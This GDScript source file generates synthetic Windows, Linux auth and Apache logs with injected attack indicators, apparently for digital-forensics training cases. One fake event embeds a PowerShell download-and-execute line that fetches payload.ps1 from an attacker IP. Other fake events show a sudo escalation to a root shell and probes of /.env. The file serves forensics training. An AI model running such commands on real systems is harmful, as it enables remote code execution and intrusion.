class_name LogGenerator
extends RefCounted
## Generates realistic log data with injected IOCs for DFIR cases.
## Produces Windows Event Logs, Linux auth/syslog, Apache access logs.

const USERNAMES := ["jsmith", "admin", "svc_backup", "webadmin", "dbadmin", "helpdesk", "cjones", "mwilson", "agarcia", "tnguyen"]
const HOSTNAMES := ["DC01", "FS01", "WEB01", "DB01", "WS001", "WS002", "WS003", "EXCH01", "PRINT01", "VPN01"]
const INTERNAL_IPS := ["192.168.1.10", "192.168.1.11", "192.168.1.20", "192.168.1.25", "192.168.1.30", "192.168.1.50", "10.0.0.1", "10.0.0.5", "10.0.0.10", "172.16.0.100"]
const USER_AGENTS := [
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (compatible; Googlebot/2.1)",
	"python-requests/2.28.1",
	"curl/7.88.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101",
]
const HTTP_PATHS := ["/", "/index.html", "/login", "/api/users", "/dashboard", "/admin", "/wp-login.php", "/.env", "/robots.txt", "/favicon.ico"]
const HTTP_METHODS := ["GET", "GET", "GET", "GET", "POST", "POST", "PUT", "DELETE"]
const SERVICES := ["sshd", "sudo", "cron", "systemd", "kernel", "postfix", "dovecot", "nginx"]
const MONTHS := ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

## IOCs to inject into generated logs
var malicious_ips: PackedStringArray = []
var malicious_domains: PackedStringArray = []
var malicious_users: PackedStringArray = []
var malicious_processes: PackedStringArray = []
var attack_start_hour: int = 21  # Attack begins at 9 PM
var attack_month: int = 1  # January
var attack_day: int = 14


## Generate Windows Security Event Log entries.
func generate_windows_evtx(line_count: int, inject_attacks: bool = true) -> String:
	var lines := PackedStringArray()
	var host: String = HOSTNAMES[randi() % HOSTNAMES.size()]

	for i in range(line_count):
		var hour: int = (8 + i * 24 / line_count) % 24
		var minute: int = randi() % 60
		var second: int = randi() % 60
		var ts := "2024-%02d-%02dT%02d:%02d:%02d" % [attack_month, attack_day, hour, minute, second]

		if inject_attacks and hour >= attack_start_hour and not malicious_ips.is_empty():
			# Inject attack events
			var attack_type := randi() % 5
			match attack_type:
				0:  # Brute force
					var target_user: String = USERNAMES[randi() % USERNAMES.size()]
					var src_ip: String = malicious_ips[randi() % malicious_ips.size()]
					lines.append("<Event><System><EventID>4625</EventID><TimeCreated SystemTime='%s'/><Computer>%s</Computer></System><EventData><Data Name='TargetUserName'>%s</Data><Data Name='IpAddress'>%s</Data><Data Name='FailureReason'>Unknown user name or bad password</Data></EventData></Event>" % [ts, host, target_user, src_ip])
				1:  # Successful logon after brute force
					var mal_user: String = malicious_users[0] if not malicious_users.is_empty() else "backdoor"
					var src_ip: String = malicious_ips[0]
					lines.append("<Event><System><EventID>4624</EventID><TimeCreated SystemTime='%s'/><Computer>%s</Computer></System><EventData><Data Name='LogonType'>10</Data><Data Name='TargetUserName'>%s</Data><Data Name='IpAddress'>%s</Data></EventData></Event>" % [ts, host, mal_user, src_ip])
				2:  # Suspicious process
					var proc: String = malicious_processes[randi() % malicious_processes.size()] if not malicious_processes.is_empty() else "cmd.exe"
					lines.append("<Event><System><EventID>4688</EventID><TimeCreated SystemTime='%s'/><Computer>%s</Computer></System><EventData><Data Name='NewProcessName'>%s</Data><Data Name='ParentProcessName'>C:\\Windows\\System32\\svchost.exe</Data></EventData></Event>" % [ts, host, proc])
				3:  # PowerShell
					var c2: String = malicious_ips[0] if not malicious_ips.is_empty() else "10.10.10.10"
					lines.append("<Event><System><EventID>4104</EventID><TimeCreated SystemTime='%s'/><Computer>%s</Computer></System><EventData><Data Name='ScriptBlockText'>Invoke-Expression (New-Object Net.WebClient).DownloadString('http://%s/payload.ps1')</Data></EventData></Event>" % [ts, host, c2])
				4:  # New service
					lines.append("<Event><System><EventID>7045</EventID><TimeCreated SystemTime='%s'/><Computer>%s</Computer></System><EventData><Data Name='ServiceName'>WindowsUpdateSvc</Data><Data Name='ImagePath'>C:\\ProgramData\\svchost.exe</Data></EventData></Event>" % [ts, host])
		else:
			# Normal events
			var event_type := randi() % 3
			match event_type:
				0:  # Normal logon
					var user: String = USERNAMES[randi() % USERNAMES.size()]
					var ip: String = INTERNAL_IPS[randi() % INTERNAL_IPS.size()]
					lines.append("<Event><System><EventID>4624</EventID><TimeCreated SystemTime='%s'/><Computer>%s</Computer></System><EventData><Data Name='LogonType'>3</Data><Data Name='TargetUserName'>%s</Data><Data Name='IpAddress'>%s</Data></EventData></Event>" % [ts, host, user, ip])
				1:  # Normal process
					lines.append("<Event><System><EventID>4688</EventID><TimeCreated SystemTime='%s'/><Computer>%s</Computer></System><EventData><Data Name='NewProcessName'>C:\\Windows\\System32\\svchost.exe</Data><Data Name='ParentProcessName'>C:\\Windows\\System32\\services.exe</Data></EventData></Event>" % [ts, host])
				2:  # Logoff
					var user: String = USERNAMES[randi() % USERNAMES.size()]
					lines.append("<Event><System><EventID>4634</EventID><TimeCreated SystemTime='%s'/><Computer>%s</Computer></System><EventData><Data Name='TargetUserName'>%s</Data></EventData></Event>" % [ts, host, user])

	return "\n".join(lines)


## Generate Linux auth.log entries.
func generate_auth_log(line_count: int, inject_attacks: bool = true) -> String:
	var lines := PackedStringArray()
	var host := "srv-%02d" % (randi() % 10 + 1)

	for i in range(line_count):
		var hour: int = (6 + i * 24 / line_count) % 24
		var minute: int = randi() % 60
		var second: int = randi() % 60
		var month_str: String = MONTHS[attack_month - 1]
		var ts := "%s %02d %02d:%02d:%02d" % [month_str, attack_day, hour, minute, second]

		if inject_attacks and hour >= attack_start_hour and not malicious_ips.is_empty():
			var attack_type := randi() % 3
			match attack_type:
				0:  # SSH brute force
					var src: String = malicious_ips[randi() % malicious_ips.size()]
					lines.append("%s %s sshd[%d]: Failed password for root from %s port %d" % [ts, host, randi() % 9000 + 1000, src, randi() % 10000 + 40000])
				1:  # Successful SSH
					var src: String = malicious_ips[0]
					var user: String = malicious_users[0] if not malicious_users.is_empty() else "webadmin"
					lines.append("%s %s sshd[%d]: Accepted password for %s from %s port %d" % [ts, host, randi() % 9000 + 1000, user, src, randi() % 10000 + 40000])
				2:  # Sudo
					var user: String = malicious_users[0] if not malicious_users.is_empty() else "webadmin"
					lines.append("%s %s sudo: %s : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash" % [ts, host, user])
		else:
			var svc: String = SERVICES[randi() % SERVICES.size()]
			var user: String = USERNAMES[randi() % USERNAMES.size()]
			var ip: String = INTERNAL_IPS[randi() % INTERNAL_IPS.size()]
			lines.append("%s %s %s[%d]: session opened for user %s from %s" % [ts, host, svc, randi() % 9000 + 1000, user, ip])

	return "\n".join(lines)


## Generate Apache access log entries.
func generate_access_log(line_count: int, inject_attacks: bool = true) -> String:
	var lines := PackedStringArray()

	for i in range(line_count):
		var hour: int = (6 + i * 24 / line_count) % 24
		var minute: int = randi() % 60
		var second: int = randi() % 60
		var ts := "%02d/%s/2024:%02d:%02d:%02d +0000" % [attack_day, MONTHS[attack_month - 1], hour, minute, second]

		if inject_attacks and hour >= (attack_start_hour - 2) and not malicious_ips.is_empty():
			var src: String = malicious_ips[randi() % malicious_ips.size()]
			var scan_type := randi() % 4
			var path := ""
			var status := 404
			var ua: String = USER_AGENTS[randi() % USER_AGENTS.size()]
			match scan_type:
				0: path = "/wp-admin/setup-config.php"
				1: path = "/.env"; status = 200
				2: path = "/api/upload"; status = 200; ua = "python-requests/2.28.1"
				3: path = "/cgi-bin/test.cgi"
			var method: String = "POST" if "upload" in path else "GET"
			lines.append("%s - - [%s] \"%s %s HTTP/1.1\" %d %d \"-\" \"%s\"" % [src, ts, method, path, status, randi() % 5000 + 100, ua])
		else:
			var ip: String = INTERNAL_IPS[randi() % INTERNAL_IPS.size()]
			var path: String = HTTP_PATHS[randi() % HTTP_PATHS.size()]
			var method: String = HTTP_METHODS[randi() % HTTP_METHODS.size()]
			var status := 200
			var ua: String = USER_AGENTS[0]
			lines.append("%s - - [%s] \"%s %s HTTP/1.1\" %d %d \"-\" \"%s\"" % [ip, ts, method, path, status, randi() % 10000 + 500, ua])

	return "\n".join(lines)
